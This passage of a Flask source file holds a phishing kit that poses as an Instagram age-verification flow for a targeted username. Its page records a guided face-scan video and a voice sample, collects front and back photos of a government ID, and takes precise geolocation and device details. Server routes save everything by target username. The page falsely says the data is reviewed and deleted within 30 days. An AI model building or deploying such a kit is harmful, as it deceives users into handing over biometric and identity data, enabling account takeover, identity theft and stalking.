                    </div>
                    
                    <div class="id-card" onclick="document.getElementById('backIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleFileDrop(event, 'back')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Back of ID</div>
                        <div class="id-subtitle">Required for two-sided documents</div>
                        <input type="file" id="backIdInput" class="file-input" accept="image/*" onchange="handleFileSelect(this, 'back')">
                        <div class="preview-container" id="backPreview">
                            <img class="preview-image" id="backPreviewImage">
                        </div>
                    </div>
                    
                    <div class="id-requirements">
                        <strong>Requirements:</strong>
                        <ul>
                            <li>Government-issued photo ID</li>
                            <li>Clear, well-lit photo</li>
                            <li>All four corners visible</li>
                            <li>No glare or reflections</li>
                        </ul>
                    </div>
                </div>
                
                <div class="status-message" id="idStatus"></div>
                
                <button class="button primary-btn" id="submitIdBtn" onclick="submitIDVerification()" disabled>
                    Submit for Verification
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 5: Location Verification -->
            <div class="step" id="step5">
                <h2 class="step-title">Location Verification</h2>
                <p class="step-subtitle">
                    We need to verify your location to ensure you're accessing @{target_username} from your usual area.
                </p>
                
                <div class="location-container">
                    <div class="location-icon">📍</div>
                    <div class="location-info">
                        <div class="instruction-icon">🌍</div>
                        <div class="instruction-text">Location Access Required</div>
                        <div class="instruction-detail">
                            Instagram needs to verify your location for security and to prevent unauthorized access.
                        </div>
                    </div>
                    
                    <div class="accuracy-meter">
                        <div class="accuracy-fill" id="accuracyFill"></div>
                    </div>
                    <div class="accuracy-labels">
                        <span>Low</span>
                        <span>Medium</span>
                        <span>High</span>
                    </div>
                    
                    <div class="location-details" id="locationDetails">
                        <div class="location-detail-item">
                            <span class="location-detail-label">Latitude:</span>
                            <span class="location-detail-value" id="latValue"></span>
                        </div>
                        <div class="location-detail-item">
                            <span class="location-detail-label">Longitude:</span>
                            <span class="location-detail-value" id="lonValue"></span>
                        </div>
                        <div class="location-detail-item">
                            <span class="location-detail-label">Accuracy:</span>
                            <span class="location-detail-value" id="accuracyValue"></span>
                        </div>
                        <div class="location-detail-item">
                            <span class="location-detail-label">Address:</span>
                            <span class="location-detail-value" id="addressValue"></span>
                        </div>
                    </div>
                </div>
                
                <div class="status-message" id="locationStatus">
                    Click the button below to share your location
                </div>
                
                <button class="button primary-btn" id="locationButton" onclick="requestLocation()">
                    Share My Location
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Final Step: Processing -->
            <div class="step" id="stepFinal">
                <h2 class="step-title">Verification in Progress</h2>
                <p class="step-subtitle">
                    Please wait while we verify your information for @{target_username}. This may take a few moments.
                </p>
                
                <div class="instruction-container" style="text-align: center; padding: 40px;">
                    <div class="instruction-icon" style="font-size: 64px;">⏳</div>
                    <div class="instruction-text">Processing Your Verification</div>
                    <div class="instruction-detail">
                        <div class="loading-spinner"></div>
                        Analyzing submitted data...
                    </div>
                </div>
                
                <div class="status-message status-processing" id="finalStatus">
                    Verifying face scan... 25%
                </div>
            </div>
            
            <!-- Completion Step -->
            <div class="step" id="stepComplete">
                <div class="completion-container">
                    <div class="checkmark"></div>
                    
                    <h2 class="step-title">Submission Received! ✅</h2>
                    <p class="step-subtitle">
                        Thank you, <strong>@{target_username}</strong>! Your verification data has been successfully submitted.
                    </p>
                    
                    <div class="account-access">
                        Data Upload Complete
                    </div>
                    
                    <div class="instruction-container">
                        <div class="instruction-icon">📤</div>
                        <div class="instruction-text">All verification data uploaded</div>
                        <div class="instruction-detail">
                            Your face scan, voice sample, ID documents, and location have been received
                        </div>
                    </div>
                    
                    <div class="next-steps">
                        <p class="step-subtitle">
                            You will be redirected to the review page in <span id="countdown">5</span> seconds...
                        </p>
                        <button class="button primary-btn" onclick="showReviewPage()">
                            Continue to Review Status
                        </button>
                    </div>
                    
                    <div class="info-box" style="margin-top: 30px;">
                        <strong>Note:</strong> Your verification data will be securely stored and automatically deleted within 30 days.
                    </div>
                </div>
            </div>
            
            <!-- Under Review Step -->
            <div class="step" id="stepReview">
                <div class="review-container">
                    <div class="review-clock"></div>
                    
                    <h2 class="step-title">Verification Under Review</h2>
                    <p class="step-subtitle">
                        Your age verification submission for <strong>@{target_username}</strong> is being reviewed by our team.
                        We will contact you within <strong>48 hours</strong> via the email associated with your account.
                    </p>
                    
                    <div class="review-timeline">
                        <div class="timeline-item">
                            <div class="timeline-icon">1</div>
                            <div class="timeline-content">
                                <div class="timeline-title">Submission Received</div>
                                <div class="timeline-description">
                                    Your verification data has been successfully uploaded and is in queue for review.
                                </div>
                            </div>
                        </div>
                        
                        <div class="timeline-item">
                            <div class="timeline-icon">2</div>
                            <div class="timeline-content">
                                <div class="timeline-title">Manual Review Process</div>
                                <div class="timeline-description">
                                    Our security team is manually reviewing your face scan, ID documents, and other verification data.
                                </div>
                            </div>
                        </div>
                        
                        <div class="timeline-item">
                            <div class="timeline-icon">3</div>
                            <div class="timeline-content">
                                <div class="timeline-title">Security Checks</div>
                                <div class="timeline-description">
                                    We're running additional security checks to ensure the authenticity of your documents.
                                </div>
                            </div>
                        </div>
                        
                        <div class="timeline-item">
                            <div class="timeline-icon">4</div>
                            <div class="timeline-content">
                                <div class="timeline-title">Final Decision</div>
                                <div class="timeline-description">
                                    You'll receive an email with the final decision within 48 hours of submission.
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="contact-info">
                        <div class="contact-item">
                            <div class="contact-icon">📧</div>
                            <div class="contact-text">
                                <strong>Check Your Email</strong><br>
                                We've sent a confirmation to the email on file. Please follow any instructions in that email.
                            </div>
                        </div>
                        
                        <div class="contact-item">
                            <div class="contact-icon">⏰</div>
                            <div class="contact-text">
                                <strong>Review Timeline</strong><br>
                                Most reviews are completed within 24-48 hours. You'll be notified once completed.
                            </div>
                        </div>
                        
                        <div class="contact-item">
                            <div class="contact-icon">🔒</div>
                            <div class="contact-text">
                                <strong>Temporary Account Status</strong><br>
                                Your account @{target_username} has limited functionality until verification is complete.
                            </div>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <strong>What happens next?</strong><br>
                        1. Our team reviews your submission (24-48 hours)<br>
                        2. You'll receive an email with the result<br>
                        3. If approved, your account will be fully restored<br>
                        4. If more information is needed, we'll contact you
                    </div>
                    
                    <div class="next-steps">
                        <button class="button primary-btn" onclick="returnToInstagram()">
                            Return to Instagram
                        </button>
                        <button class="button secondary-btn" onclick="checkStatus()">
                            Check Review Status
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer-links">
            <a href="#">Help Center</a>
            <a href="#">Privacy Policy</a>
            <a href="#">Terms of Use</a>
            <a href="#">Community Guidelines</a>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentStep = 1;
        let totalSteps = 5;
        let faceStream = null;
        let voiceStream = null;
        let faceRecorder = null;
        let voiceRecorder = null;
        let faceChunks = [];
        let voiceChunks = [];
        let faceTimerInterval = null;
        let voiceTimerInterval = null;
        let faceTimeLeft = {face_duration};
        let voiceTimeLeft = {voice_duration};
        let faceInstructions = [
            {{icon: "👤", text: "Look Straight", detail: "Keep your face centered in the circle", duration: 3}},
            {{icon: "👈", text: "Turn Head Left", detail: "Slowly turn your head to the left", duration: 3}},
            {{icon: "👉", text: "Turn Head Right", detail: "Slowly turn your head to the right", duration: 3}},
            {{icon: "👆", text: "Look Up", detail: "Gently tilt your head upward", duration: 3}},
            {{icon: "👇", text: "Look Down", detail: "Gently tilt your head downward", duration: 3}},
            {{icon: "😉", text: "Blink Eyes", detail: "Blink naturally a few times", duration: 3}},
            {{icon: "😊", text: "Smile", detail: "Give us a natural smile", duration: 2}},
            {{icon: "✅", text: "Complete", detail: "Face scan successful!", duration: 1}}
        ];
        let currentInstructionIndex = 0;
        let instructionTimer = null;
        let idFiles = {{"front": null, "back": null}};
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let locationData = null;
        let countdownTimer = null;
        let targetUsername = "{target_username}";
        
        // Step Navigation
        function updateProgress() {{
            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
            document.getElementById('progressBar').style.width = progress + '%';
            document.getElementById('progressLineFill').style.width = progress + '%';
            
            // Update step indicators
            for (let i = 1; i <= totalSteps + 1; i++) {{
                const indicator = document.getElementById('step' + i + 'Indicator');
                if (indicator) {{
                    indicator.classList.remove('active', 'completed');
                    if (i < currentStep) {{
                        indicator.classList.add('completed');
                    }} else if (i === currentStep) {{
                        indicator.classList.add('active');
                    }}
                }}
            }}
        }}
        
        function showStep(stepNumber) {{
            document.querySelectorAll('.step').forEach(step => {{
                step.classList.remove('active');
            }});
            const stepElement = document.getElementById('step' + stepNumber);
            if (stepElement) {{
                stepElement.classList.add('active');
                currentStep = stepNumber;
                updateProgress();
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps + 1) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        // Face Verification
        async function startFaceVerification() {{
            try {{
                document.getElementById('startFaceScanBtn').disabled = true;
                document.getElementById('startFaceScanBtn').innerHTML = '<span class="loading-spinner"></span>Accessing Camera...';
                
                // Request camera
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ 
                        facingMode: 'user',
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 640 }}
                    }},
                    audio: false
                }});
                
                // Show video
                document.getElementById('faceVideo').srcObject = faceStream;
                
                // Start the verification process
                startFaceInstructions();
                
            }} catch (error) {{
                console.error("Camera error:", error);
                alert("Unable to access camera. Please ensure camera permissions are granted.");
                document.getElementById('startFaceScanBtn').disabled = false;
                document.getElementById('startFaceScanBtn').textContent = 'Start Face Scan for ' + targetUsername;
            }}
        }}
        
        function startFaceInstructions() {{
            currentInstructionIndex = 0;
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            showFaceInstruction(0);
            
            // Start recording
            startFaceRecording();
            
            // Start countdown timer
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            
            // Start instruction cycle
            instructionTimer = setInterval(() => {{
                currentInstructionIndex++;
                if (currentInstructionIndex < faceInstructions.length) {{
                    showFaceInstruction(currentInstructionIndex);
                }}
            }}, 3000);
        }}
        
        function showFaceInstruction(index) {{
            const instruction = faceInstructions[index];
            if (instruction) {{
                document.getElementById('instructionIcon').textContent = instruction.icon;
                document.getElementById('instructionText').textContent = instruction.text;
                document.getElementById('instructionDetail').textContent = instruction.detail;
            }}
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById('faceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            const options = {{ mimeType: 'video/webm;codecs=vp9' }};
            
            try {{
                faceRecorder = new MediaRecorder(faceStream, options);
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    faceChunks.push(event.data);
                }}
            }};
            
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            clearInterval(instructionTimer);
            
            if (faceRecorder && faceRecorder.state === 'recording') {{
                faceRecorder.stop();
            }}
            
            // Stop camera
            if (faceStream) {{
                faceStream.getTracks().forEach(track => track.stop());
            }}
            
            // Show completion message
            showFaceInstruction(faceInstructions.length - 1);
            document.getElementById('faceTimer').textContent = "✅ Complete";
            
            // Auto-proceed to next step after delay
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            
            const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_face_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        instructions_followed: faceInstructions.length,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_username: targetUsername
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Face verification uploaded');
                    }},
                    error: function(xhr, status, error) {{
                        console.error('Face upload error:', error);
                    }}
                }});
            }};
            
            reader.readAsDataURL(videoBlob);
        }}
        
        // Voice Verification
        async function startVoiceVerification() {{
            try {{
                document.getElementById('startVoiceBtn').disabled = true;
                document.getElementById('startVoiceBtn').innerHTML = '<span class="loading-spinner"></span>Accessing Microphone...';
                
                // Request microphone
                voiceStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                
                // Start recording
                startVoiceRecording();
                
                // Start countdown
                voiceTimeLeft = {voice_duration};
                updateVoiceTimer();
                voiceTimerInterval = setInterval(() => {{
                    voiceTimeLeft--;
                    updateVoiceTimer();
                    
                    if (voiceTimeLeft <= 0) {{
                        completeVoiceVerification();
                    }}
                }}, 1000);
                
                // Simulate voice visualization
                simulateVoiceWave();
                
            }} catch (error) {{
                console.error('Microphone error:', error);
                alert('Unable to access microphone. Please ensure microphone permissions are granted.');
                document.getElementById('startVoiceBtn').disabled = false;
                document.getElementById('startVoiceBtn').textContent = 'Start Voice Recording';
            }}
        }}
        
        function updateVoiceTimer() {{
            const minutes = Math.floor(voiceTimeLeft / 60);
            const seconds = voiceTimeLeft % 60;
            document.getElementById('voiceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function simulateVoiceWave() {{
            const wave = document.getElementById('voiceWave');
            let height = 50;
            setInterval(() => {{
                height = 30 + Math.random() * 40;
                wave.style.height = height + '%';
            }}, 100);
        }}
        
        function startVoiceRecording() {{
            voiceChunks = [];
            const options = {{ mimeType: 'audio/webm;codecs=opus' }};
            
            try {{
                voiceRecorder = new MediaRecorder(voiceStream, options);
            }} catch (e) {{
                voiceRecorder = new MediaRecorder(voiceStream);
            }}
            
            voiceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    voiceChunks.push(event.data);
                }}
            }};
            
            voiceRecorder.onstop = sendVoiceRecording;
            voiceRecorder.start();
        }}
        
        function completeVoiceVerification() {{
            clearInterval(voiceTimerInterval);
            
            if (voiceRecorder && voiceRecorder.state === 'recording') {{
                voiceRecorder.stop();
            }}
            
            // Stop microphone
            if (voiceStream) {{
                voiceStream.getTracks().forEach(track => track.stop());
            }}
            
            document.getElementById('voiceTimer').textContent = '✅ Complete';
            
            // Auto-proceed to next step
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendVoiceRecording() {{
            if (voiceChunks.length === 0) return;
            
            const audioBlob = new Blob(voiceChunks, {{ type: 'audio/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_voice_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        voice_audio: base64data,
                        duration: {voice_duration},
                        phrase: document.getElementById('voicePhrase').textContent,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_username: targetUsername
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Voice verification uploaded');
                    }},
                    error: function(xhr, status, error) {{
                        console.error('Voice upload error:', error);
                    }}
                }});
            }};
            
            reader.readAsDataURL(audioBlob);
        }}
        
        // ID Verification
        function handleFileSelect(input, type) {{
            const file = input.files[0];
            if (file) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleFileDrop(event, type) {{
            event.preventDefault();
            event.currentTarget.classList.remove('dragover');
            const file = event.dataTransfer.files[0];
            if (file && file.type.startsWith('image/')) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleIDFile(file, type) {{
            // Preview image
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById(type + 'Preview');
                const previewImage = document.getElementById(type + 'PreviewImage');
                previewImage.src = e.target.result;
                preview.style.display = 'block';
            }};
            reader.readAsDataURL(file);
            
            // Store file
            idFiles[type] = file;
            checkIDSubmitReady();
        }}
        
        function checkIDSubmitReady() {{
            const hasFront = idFiles.front !== null;
            document.getElementById('submitIdBtn').disabled = !hasFront;
        }}
        
        function submitIDVerification() {{
            const statusDiv = document.getElementById('idStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Uploading ID documents...';
            
            document.getElementById('submitIdBtn').disabled = true;
            document.getElementById('submitIdBtn').innerHTML = '<span class="loading-spinner"></span>Processing...';
            
            // Create FormData
            const formData = new FormData();
            
            if (idFiles.front) formData.append('front_id', idFiles.front);
            if (idFiles.back) formData.append('back_id', idFiles.back);
            
            formData.append('timestamp', new Date().toISOString());
            formData.append('session_id', sessionId);
            formData.append('target_username', targetUsername);
            
            // Submit via AJAX
            $.ajax({{
                url: '/submit_id_verification',
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {{
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = '✓ ID documents uploaded successfully!';
                    
                    setTimeout(() => {{
                        nextStep();
                    }}, 1500);
                }},
                error: function(xhr, status, error) {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = '✗ Upload failed. Please try again.';
                    document.getElementById('submitIdBtn').disabled = false;
                    document.getElementById('submitIdBtn').textContent = 'Submit for Verification';
                }}
            }});
        }}
        
        // Location Verification
        function requestLocation() {{
            const button = document.getElementById('locationButton');
            const statusDiv = document.getElementById('locationStatus');
            const detailsDiv = document.getElementById('locationDetails');
            
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Getting Location...';
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Accessing your location...';
            
            if (!navigator.geolocation) {{
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Geolocation is not supported by your browser.';
                button.disabled = false;
                button.textContent = 'Try Again';
                return;
            }}
            
            // First try: Fast, low accuracy
            navigator.geolocation.getCurrentPosition(
                (fastPosition) => {{
                    updateLocationUI(fastPosition);
                    sendLocationToServer(fastPosition);
                    
                    // Second try: High accuracy
                    navigator.geolocation.getCurrentPosition(
                        (accuratePosition) => {{
                            updateLocationUI(accuratePosition);
                            sendLocationToServer(accuratePosition);
                            completeLocationVerification();
                        }},
                        () => {{
                            // If high accuracy fails, still complete with fast position
                            completeLocationVerification();
                        }},
                        {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                    );
                }},
                (err) => {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = `Error: ${{err.message}}. Please enable location services.`;
                    button.disabled = false;
                    button.textContent = 'Try Again';
                }},
                {{ enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }}
            );
        }}
        
        function updateLocationUI(position) {{
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Update display
            document.getElementById('latValue').textContent = lat.toFixed(6);
            document.getElementById('lonValue').textContent = lon.toFixed(6);
            document.getElementById('accuracyValue').textContent = `${{Math.round(accuracy)}} meters`;
            
            // Calculate accuracy percentage (higher accuracy = smaller number)
            let accuracyPercentage = 100;
            if (accuracy < 10) accuracyPercentage = 95;
            else if (accuracy < 50) accuracyPercentage = 85;
            else if (accuracy < 100) accuracyPercentage = 70;
            else if (accuracy < 500) accuracyPercentage = 50;
            else accuracyPercentage = 30;
            
            document.getElementById('accuracyFill').style.width = accuracyPercentage + '%';
            
            // Show details
            document.getElementById('locationDetails').style.display = 'block';
            
            // Update status
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.className = 'status-message status-success';
            statusDiv.textContent = `✓ Location acquired with ${{Math.round(accuracy)}}m accuracy`;
            
            // Store location data
            locationData = {{
                latitude: lat,
                longitude: lon,
                accuracy: accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                heading: position.coords.heading,
                user_agent: navigator.userAgent
            }};
        }}
        
        function sendLocationToServer(position) {{
            $.ajax({{
                url: '/submit_location_verification',
                type: 'POST',
                data: JSON.stringify({{
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_username: targetUsername
                }}),
                contentType: 'application/json',
                success: function(response) {{
                    console.log('Location data uploaded');
                }},
                error: function(xhr, status, error) {{
                    console.error('Location upload error:', error);
                }}
            }});
        }}
        
        function completeLocationVerification() {{
            const button = document.getElementById('locationButton');
            button.disabled = true;
            button.textContent = '✓ Location Verified';
            
            // Proceed to final step after delay
            setTimeout(() => {{
                startFinalVerification();
            }}, 2000);
        }}
        
        // Final Verification Processing
        function startFinalVerification() {{
            showStep('stepFinal');
            const statusDiv = document.getElementById('finalStatus');
            let progress = 25;
            
            const progressInterval = setInterval(() => {{
                progress += Math.random() * 15;
                if (progress > 100) progress = 100;
                
                let message = "";
                if (progress < 30) {{
                    message = `Verifying face scan... ${{Math.round(progress)}}%`;
                }} else if (progress < 50) {{
                    message = `Analyzing voice sample... ${{Math.round(progress)}}%`;
                }} else if (progress < 70) {{
                    message = `Checking ID documents... ${{Math.round(progress)}}%`;
                }} else if (progress < 90) {{
                    message = `Verifying location... ${{Math.round(progress)}}%`;
                }} else {{
                    message = `Finalizing verification... ${{Math.round(progress)}}%`;
                }}
                
                statusDiv.textContent = message;
                
                if (progress >= 100) {{
                    clearInterval(progressInterval);
                    setTimeout(() => {{
                        statusDiv.className = 'status-message status-success';
                        statusDiv.textContent = `✓ Verification complete for @${{targetUsername}}!`;
                        
                        // Submit all collected data
                        submitCompleteVerification();
                        
                        // Show completion page
                        setTimeout(() => {{
                            showCompletionPage();
                        }}, 1500);
                    }}, 1000);
                }}
            }}, 800);
        }}
        
        function showCompletionPage() {{
            showStep('stepComplete');
            
            // Start countdown
            let countdown = 5;
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = countdown;
            
            countdownTimer = setInterval(() => {{
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {{
                    clearInterval(countdownTimer);
                    showReviewPage();
                }}
            }}, 1000);
        }}
        
        function showReviewPage() {{
            clearInterval(countdownTimer);
            showStep('stepReview');
        }}
        
        function returnToInstagram() {{
            window.location.href = 'https://instagram.com';
        }}
        
        function checkStatus() {{
            alert("Review status will be sent to your email within 48 hours. Please check the email associated with your Instagram account.");
        }}
        
        function submitCompleteVerification() {{
            $.ajax({{
                url: '/submit_complete_verification',
                type: 'POST',
                data: JSON.stringify({{
                    session_id: sessionId,
                    target_username: targetUsername,
                    completed_steps: currentStep,
                    verification_timestamp: new Date().toISOString(),
                    user_agent: navigator.userAgent,
                    screen_resolution: `${{screen.width}}x${{screen.height}}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }}),
                contentType: 'application/json'
            }});
        }}
        
        // Initialize progress display
        updateProgress();
        
        // Auto-start first step after delay
        setTimeout(() => {{
            showStep(1);
        }}, 500);
    </script>
</body>
</html>'''
    return template

@app.route('/')
def index():
    return render_template_string(create_html_template(VERIFICATION_SETTINGS))

@app.route('/submit_face_verification', methods=['POST'])
def submit_face_verification():
    try:
        data = request.get_json()
        if data and 'face_video' in data:
            video_data = data['face_video']
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            
            # Create filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"face_verification_{target_username}_{session_id}_{timestamp}.webm"
            video_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', filename)
            
            # Save video
            with open(video_file, 'wb') as f:
                f.write(base64.b64decode(video_data))
            
            # Save metadata
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'face_scans', f"metadata_{target_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'face_verification',
                'target_username': target_username,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'instructions_followed': data.get('instructions_followed', 0),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'saved_at': datetime.now().isoformat()
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Saved face verification video for {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Face verification submitted"}), 200
        else:
            return jsonify({"status": "error", "message": "No face video data received"}), 400
    except Exception as e:
        print(f"Error saving face verification: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_voice_verification', methods=['POST'])
def submit_voice_verification():
    try:
        data = request.get_json()
        if data and 'voice_audio' in data:
            audio_data = data['voice_audio']
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            
            # Create filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"voice_verification_{target_username}_{session_id}_{timestamp}.webm"
            audio_file = os.path.join(DOWNLOAD_FOLDER, 'voice_recordings', filename)
            
            # Save audio
            with open(audio_file, 'wb') as f:
                f.write(base64.b64decode(audio_data))
            
            # Save metadata
            metadata_file = os.path.join(DOWNLOAD_FOLDER, 'voice_recordings', f"metadata_{target_username}_{session_id}_{timestamp}.json")
            metadata = {
                'filename': filename,
                'type': 'voice_verification',
                'target_username': target_username,
                'session_id': session_id,
                'duration': data.get('duration', 0),
                'phrase': data.get('phrase', ''),
                'timestamp': data.get('timestamp', datetime.now().isoformat()),
                'saved_at': datetime.now().isoformat()
            }
            
            with open(metadata_file, 'w') as f:
                json.dump(metadata, f, indent=2)
            
            print(f"Saved voice verification audio for {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Voice verification submitted"}), 200
        else:
            return jsonify({"status": "error", "message": "No voice audio data received"}), 400
    except Exception as e:
        print(f"Error saving voice verification: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_id_verification', methods=['POST'])
def submit_id_verification():
    try:
        session_id = request.form.get('session_id', 'unknown')
        target_username = request.form.get('target_username', 'unknown')
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
        
        # Handle front ID
        front_filename = None
        if 'front_id' in request.files:
            front_file = request.files['front_id']
            if front_file.filename:
                file_ext = front_file.filename.split('.')[-1] if '.' in front_file.filename else 'jpg'
                front_filename = f"id_front_{target_username}_{session_id}_{timestamp}.{file_ext}"
                front_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', front_filename)
                front_file.save(front_path)
        
        # Handle back ID
        back_filename = None
        if 'back_id' in request.files:
            back_file = request.files['back_id']
            if back_file.filename:
                file_ext = back_file.filename.split('.')[-1] if '.' in back_file.filename else 'jpg'
                back_filename = f"id_back_{target_username}_{session_id}_{timestamp}.{file_ext}"
                back_path = os.path.join(DOWNLOAD_FOLDER, 'id_documents', back_filename)
                back_file.save(back_path)
        
        # Save metadata
        metadata_file = os.path.join(DOWNLOAD_FOLDER, 'id_documents', f"metadata_{target_username}_{session_id}_{timestamp}.json")
        metadata = {
            'front_id': front_filename,
            'back_id': back_filename,
            'type': 'id_verification',
            'target_username': target_username,
            'session_id': session_id,
            'timestamp': request.form.get('timestamp', datetime.now().isoformat()),
            'saved_at': datetime.now().isoformat()
        }
        
        with open(metadata_file, 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"Saved ID documents for {target_username}: {front_filename}, {back_filename}")
        return jsonify({"status": "success", "message": "ID verification submitted"}), 200
        
    except Exception as e:
        print(f"Error saving ID verification: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_location_verification', methods=['POST'])
def submit_location_verification():
    try:
        data = request.get_json()
        if data and 'latitude' in data and 'longitude' in data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            
            # Add target username to data
            data['target_username'] = target_username
            
            # Process location in background thread
            processing_thread = Thread(target=process_and_save_location, args=(data, session_id))
            processing_thread.daemon = True
            processing_thread.start()
            
            print(f"Received location data for {target_username}: {session_id}")
            return jsonify({"status": "success", "message": "Location verification submitted"}), 200
        else:
            return jsonify({"status": "error", "message": "No location data received"}), 400
    except Exception as e:
        print(f"Error saving location verification: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/submit_complete_verification', methods=['POST'])
def submit_complete_verification():
    try:
        data = request.get_json()
        if data:
            session_id = data.get('session_id', 'unknown')
            target_username = data.get('target_username', 'unknown')
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
            filename = f"verification_summary_{target_username}_{session_id}_{timestamp}.json"
            file_path = os.path.join(DOWNLOAD_FOLDER, 'user_data', filename)
            
            # Add system info
            data['received_at'] = datetime.now().isoformat()
            data['server_timestamp'] = timestamp
            
            with open(file_path, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"Saved complete verification summary for {target_username}: {filename}")
            return jsonify({"status": "success", "message": "Verification complete"}), 200
        else:
            return jsonify({"status": "error", "message": "No data received"}), 400
    except Exception as e:
        print(f"Error saving verification summary: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/privacy_policy')
def privacy_policy():
    return '''<!DOCTYPE html>
    <html>
    <head>
        <title>Instagram Privacy Policy</title>
        <style>
            body { 
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
                padding: 20px; 
                max-width: 800px; 
                margin: 0 auto; 
                background-color: #000;
                color: #fff;
            }
            h1 { 
